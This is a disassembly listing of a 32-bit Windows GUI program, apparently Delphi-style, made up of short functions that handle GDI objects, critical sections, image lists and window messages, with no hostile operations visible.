cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4219dc
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_418778
retn
sub_421b23
jmp sub_403788
sub_421b28
mov ebx 0x1
call sub_403af0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421b8b
jmp sub_403788
sub_421b90
mov ebx 0x80030103
call sub_403af0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421c0e
jmp sub_403788
sub_421c13
mov ebx 0x80030009
call sub_403af0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_421c71
jmp sub_403788
sub_421c76
mov ebx 0x8000ffff
call sub_403af0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421e41
jmp sub_403a3c
sub_421e52
jmp sub_403788
sub_421e57
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421e80
lea eax [ ebp + 0xc ]
call sub_405934
retn
sub_421e79
jmp sub_403a3c
sub_421e80
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_421e8c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_421e98
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_421ea4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_421eb0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_421f1f
jmp sub_403788
sub_421f24
mov esi 0x8000ffff
call sub_403af0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421f38
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_421fa5
jmp sub_403a3c
sub_421fac
mov eax [ rw-data ]
call sub_4032a8
pop edi
pop esi
pop ebx
pop ebp
retn
sub_421fbc
call sub_417ebc
retn
sub_422084
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_422228
jmp sub_403a3c
sub_42222f
pop ebp
retn
sub_4222bd
jmp sub_403a3c
sub_4222c4
pop ebp
retn
sub_42266d
jmp sub_403a3c
sub_422674
pop ebp
retn
sub_422678
sub [ rw-data ] 0x1
retn
sub_423085
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
xchg [ esp ] eax
retn
sub_423092
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
sub_42309f
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_4231e9
add eax 0xffffffd8
jmp sub_427a1c
sub_4231f1
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_423714
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_423788
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_4237fc
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423808
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4238e8
jmp sub_403a3c
sub_4238ef
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42397f
jmp sub_403a3c
sub_423a11
jmp sub_403a3c
sub_423a18
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423a7c
jmp sub_403a3c
sub_423a83
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423aeb
jmp sub_403a3c
sub_423af2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423b95
jmp sub_403a3c
sub_423b9c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423ff4
push 0x33
mov ecx rw-data
call sub_4181f8
retn
sub_424004
push 0x33
mov ecx rw-data
call sub_4181b8
retn
sub_424014
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_424038
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_42420c
push 0x11
mov ecx rw-data
call sub_4181b8
retn
sub_42434c
push ebx
mov ebx eax
mov eax ebx
call sub_424014
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_424406
jmp sub_403a3c
sub_42440d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424038
retn
sub_424423
jmp sub_403a3c
sub_42443c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_424499
jmp sub_403a3c
sub_4244a0
pop ebx
pop ecx
pop ebp
retn
sub_424619
jmp sub_403a3c
sub_424641
jmp sub_403a3c
sub_424648
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4247cc
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_4248ea
jmp sub_403a3c
sub_4248f1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424038
retn
sub_424907
jmp sub_403a3c
sub_42497d
jmp sub_403a3c
sub_424984
pop ebx
pop ecx
pop ebp
retn
sub_424988
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_424a3e
jmp sub_403a3c
sub_424a50
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_4034a4
sub_424a64
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424a94
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_424ba3
jmp sub_403a3c
sub_424baa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424038
retn
sub_424bc0
jmp sub_403a3c
sub_424c39
jmp sub_403a3c
sub_424c40
pop ebx
pop ecx
pop ebp
retn
sub_424d71
jmp sub_403a3c
sub_424d84
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_425154
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_425434
jmp sub_403a3c
sub_42543b
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_425444
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_42547c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_425488
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4255ec
retn
sub_4256b5
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4256cc
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4257b8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4257d8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4257f8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425818
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
pop ebx
retn
sub_425830
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
pop ebx
retn
sub_425854
mov eax [ rw-data ]
call sub_425830
retn
sub_4258b6
jmp sub_403a3c
sub_4258bd
pop ecx
pop ebp
retn
sub_42595c
jmp sub_403a3c
sub_425963
pop ebx
mov esp ebp
pop ebp
retn
sub_425a35
jmp sub_403a3c
sub_425ac6
jmp sub_403a3c
sub_425acd
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425af8
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_425bdf
jmp sub_403a3c
sub_425d8c
jmp sub_403a3c
sub_425d93
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_425fa5
jmp sub_403a3c
sub_425fac
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_426046
jmp sub_403a3c
sub_426222
jmp sub_403a3c
sub_4262dc
jmp sub_403a3c
sub_4262e3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426303
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4262fc
jmp sub_403a3c
sub_426303
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_426491
jmp sub_403a3c
sub_42665c
jmp sub_403a3c
sub_426663
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426686
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026ec
retn
sub_42667f
jmp sub_403a3c
sub_426686
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4266a6
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
sub_42669f
jmp sub_403a3c
sub_4266a6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4266b0
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_426810
push 0x0
call sub_4267ac
retn
sub_4268b5
jmp sub_403a3c
sub_4268bc
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4268c8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_426818
pop ebx
pop ebp
retn 0x4
sub_4268dc
retn
sub_4268e0
test eax eax
jne r-xdata
retn
call sub_4268dc
sub_426ab3
jmp sub_403a3c
sub_426ada
jmp sub_403a3c
sub_426ae1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426b20
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_426ced
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub_426cf6
jmp sub_403a3c
j_sub_426ced
jmp sub_426ced
sub_426cfd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
sub_426d13
jmp sub_403a3c
sub_426d24
xor eax eax
retn
sub_426d28
mov al [ eax + 0x21 ]
retn
sub_426d74
jmp sub_403a3c
sub_426d7b
pop esi
pop ecx
pop ebp
retn
sub_426da8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_426dff
jmp sub_403a3c
sub_426e06
pop esi
pop ecx
pop ebp
retn
sub_426e0c
retn
sub_426e10
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426e20
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_426fa5
jmp sub_403a3c
sub_426fac
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4270cb
jmp sub_403a3c
sub_4270d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_427163
jmp sub_403a3c
sub_42716a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4271f2
jmp sub_403a3c
sub_4271f9
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427383
jmp sub_403a3c
sub_42738a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_427540
jmp sub_403788
sub_4275a0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426ec8
mov [ rw-data ] eax
sub_4275c0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427450
mov [ rw-data ] eax
sub_427700
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_427684
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_4277a8
jmp sub_403788
sub_42788b
jmp sub_403788
sub_4278ec
jmp sub_403a3c
sub_4278f3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427973
jmp sub_403788
sub_4279ec
push ebx
mov ebx edx
call sub_4275c0
mov edx ebx
call sub_427564
test eax eax
setne al
pop ebx
retn
sub_427a04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4276e8
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_427a1c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4276e8
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_427b65
jmp sub_403788
sub_427be3
jmp sub_403a3c
sub_427bea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427d84
retn
sub_427f24
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_428228
jmp sub_403a3c
sub_42822f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4283a7
jmp sub_403a3c
sub_4283ae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42843d
jmp sub_403a3c
sub_428444
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428466
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
sub_42845f
jmp sub_403a3c
sub_428466
pop ebx
mov esp ebp
pop ebp
retn
sub_428479
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_428760
jmp r-xdata
retn
sub_42848f
call sub_4287ec
retn
sub_428584
retn
sub_4287dc
jmp sub_403a3c
sub_428907
jmp sub_403a3c
sub_42890e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_428927
jmp sub_403a3c
sub_428afe
jmp sub_403a3c
sub_428b26
jmp sub_403a3c
sub_428b2d
mov esp ebp
pop ebp
retn
sub_428ba4
jmp sub_403a3c
sub_428cac
jmp sub_403a3c
sub_428d97
jmp sub_403a3c
sub_428da4
inc [ eax + 0x4 ]
retn
sub_428f1f
jmp sub_403a3c
sub_4292d0
jmp sub_403a3c
sub_42951a
jmp sub_403a3c
sub_429544
jmp sub_403a3c
sub_42954b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42956d
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_429566
jmp sub_403a3c
sub_429577
jmp sub_403788
sub_4295c6
jmp sub_403a3c
sub_4297f3
jmp sub_403a3c
sub_42983b
jmp sub_403a3c
sub_4299a8
jmp sub_403a3c
sub_429a6f
jmp sub_403788
sub_429ac4
mov [ eax + 0x31 ] 0x0
call sub_426b20
retn
sub_429d15
jmp sub_403a3c
sub_429d80
jmp sub_403a3c
sub_429d87
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429df8
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_429eac
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_429ebc
push ebx
mov ebx eax
mov eax ebx
call sub_42a160
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_429ed0
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_429eec
push ebx
mov ebx eax
mov eax ebx
call sub_42a1c0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_42a034
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_42a143
jmp sub_403a3c
sub_42a374
jmp sub_403a3c
sub_42a37b
pop ebx
pop ecx
pop ebp
retn
sub_42a407
jmp sub_403788
sub_42a467
jmp sub_403a3c
sub_42a46e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42a84f
jmp sub_403a3c
sub_42a87b
jmp sub_403a3c
sub_42a8e2
jmp sub_403788
sub_42a913
jmp sub_403a3c
sub_42a998
jmp sub_403788
sub_42a99d
mov eax [ ebp - 0x38 ]
call sub_4032a8
call sub_403a9c
call sub_403af0
sub_42a9af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a9cc
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
sub_42a9c5
jmp sub_403a3c
sub_42ab1b
jmp sub_403788
sub_42ade7
jmp sub_403788
sub_42af71
jmp sub_403a3c
sub_42b030
mov cl 0x1
call sub_42b038
retn
sub_42b2ed
add [ eax ] al
add [ ebx ] dh
leave
call sub_42b038
retn
sub_42b372
jmp sub_403788
sub_42b377
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a9c
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42b3c8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42b501
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42b530
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42b544
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42b65d
jmp sub_403788
sub_42b712
jmp sub_403788
sub_42b77c
jmp sub_403788
sub_42b7b0
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_42b73c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_42b7c8
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425818
retn
mov [ eax + 0x30 ] edx
retn
sub_42b7e0
retn
sub_42b7e4
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425818
retn
mov [ eax + 0x2c ] edx
retn
sub_42b824
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425818
pop ebp
retn 0x4
sub_42b838
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425818
pop ebp
retn 0x4
sub_42b88d
jmp sub_403a3c
sub_42b894
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ba48
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42ba54
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42bb01
jmp sub_403a3c
sub_42bb08
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42bbf3
jmp sub_403788
sub_42bc5f
jmp sub_403a3c
sub_42bd8d
jmp sub_403a3c
sub_42bd94
pop ebp
retn
sub_42bec9
jmp sub_403a3c
sub_42bed0
pop ebp
retn
sub_42bed4
sub [ rw-data ] 0x1
retn
sub_42bf95
retn 0x42
sub_42c078
call sub_418778
retn
sub_42c100
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_418b3c
pop esi
pop ebx
retn
sub_42c128
call sub_418930
retn
sub_42c164
call sub_418a70
retn
sub_42c16c
mov eax 0x42c1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x42
sub_42c25c
call sub_42c078
retn
sub_42c294
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42c100
pop esi
pop ebx
retn
sub_42c2a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42c114
pop esi
pop ebx
retn
sub_42c2bc
mov edx ecx
call sub_42c294
retn
sub_42c2c4
call sub_42c128
retn
sub_42c334
call sub_42c164
retn
sub_42c3d0
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4188d4
retn
sub_42c404
mov eax [ eax + 0x4 ]
call sub_418778
retn
sub_42c435
jmp sub_403a3c
sub_42c43c
pop ebp
retn
sub_42c440
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ InitCommonControls@IAT ]
ImageList_Create
jmp [ __import_lookup_table_13(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
sub_42c528
shl eax 0x8
retn
ImageList_Replace
jmp [ __import_lookup_table_13(comctl32:ImageList_Replace) ]
ImageList_Remove
jmp [ __import_lookup_table_13(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ __import_lookup_table_13(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ __import_lookup_table_13(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_13(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_13(comctl32:ImageList_SetIconSize) ]
sub_42c5ac
push 0x0
push 0x0
push 0x1004
push eax
call SendMessageA
retn
sub_42c5bc
shl eax 0xc
retn
sub_42c5c0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1005
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c5d8
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c5f0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1007
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c608
push ecx
push edx
push 0x100d
push eax
call SendMessageA
retn
sub_42c715
jmp sub_403a3c
sub_42c71c
pop ebp
retn
sub_42c720
sub [ rw-data ] 0x1
retn
sub_42c7e7
jmp sub_403a3c
sub_42c7ee
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ce04
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42c810
mov [ rw-data ] sub_42c928
mov [ rw-data ] sub_42c898
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42cb2c
mov [ rw-data ] sub_42cc00
mov [ rw-data ] sub_42ccd4
retn
sub_42ce95
jmp sub_403a3c
sub_42ce9c
pop ebp
retn
sub_42cea0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42ce04
sub_42ced5
jmp sub_403a3c
sub_42cedc
pop ebp
retn
sub_42cee0
sub [ rw-data ] 0x1
retn
sub_42d121
add eax 0xffffffd8
jmp sub_42dda4
sub_42d129
add eax 0xffffffd8
jmp sub_42ddb8
sub_42d13b
add [ esp + 0x4 ] 0xffffffd8
jmp sub_405a08
sub_42d145
add [ esp + 0x4 ] 0xffffffd8
jmp sub_405a1c
sub_42d14f
add eax 0xffffffd4
jmp sub_42d870
sub_42d157
add eax 0xffffffd4
jmp sub_42da84
sub_42d15f
add eax 0xffffffd4
jmp sub_42db98
sub_42d16f
add eax 0xffffffd4
jmp sub_42dc9c
sub_42d177
add eax 0xffffffd4
jmp sub_42dcf8
sub_42d189
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a08
sub_42d193
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a1c
sub_42d322
jmp sub_403a3c
sub_42d329
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42d539
jmp sub_403a3c
sub_42d540
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d6f5
jmp sub_403a3c
sub_42d75a
jmp sub_403a3c
sub_42d761
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d84d
jmp sub_403a3c
sub_42d854
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42da64
lea eax [ ebp - 0x30 ]
call sub_404038
lea eax [ ebp - 0x20 ]
call sub_404038
retn
sub_42da75
jmp sub_403a3c
j_sub_42da64
jmp sub_42da64
sub_42da7c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42db77
jmp sub_403a3c
sub_42db7e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42db98
call sub_42d5c8
retn
sub_42dc7b
jmp sub_403a3c
sub_42dc82
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dce2
lea eax [ ebp - 0x4 ]
call sub_405934
retn
sub_42dceb
jmp sub_403a3c
j_sub_42dce2
jmp sub_42dce2
sub_42dcf2
pop ebx
pop ecx
pop ebp
retn
sub_42dd8d
jmp sub_403a3c
sub_42dd94
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42dda0
mov eax [ eax + 0x20 ]
retn
sub_42dda4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_40408c
pop esi
pop ebx
retn
sub_42decf
jmp sub_403a3c
sub_42ded6
pop ebp
retn
sub_42ded8
sub [ rw-data ] 0x1
retn
sub_42df05
jmp sub_403a3c
sub_42df0c
pop ebp
retn
sub_42df10
sub [ rw-data ] 0x1
retn
sub_42df49
jmp sub_403a3c
sub_42df50
pop ebp
retn
sub_42df54
sub [ rw-data ] 0x1
retn
sub_42e261
jmp sub_403a3c
sub_42e268
pop ebp
retn
sub_42e26c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42dfb8
sub_42e34c
retn
sub_42e3c0
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42e3cc
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42e3d8
mov edx [ eax ]
call [ edx ]
retn
sub_42e3e0
mov edx [ eax ]
call [ edx + 0x4 ]
retn
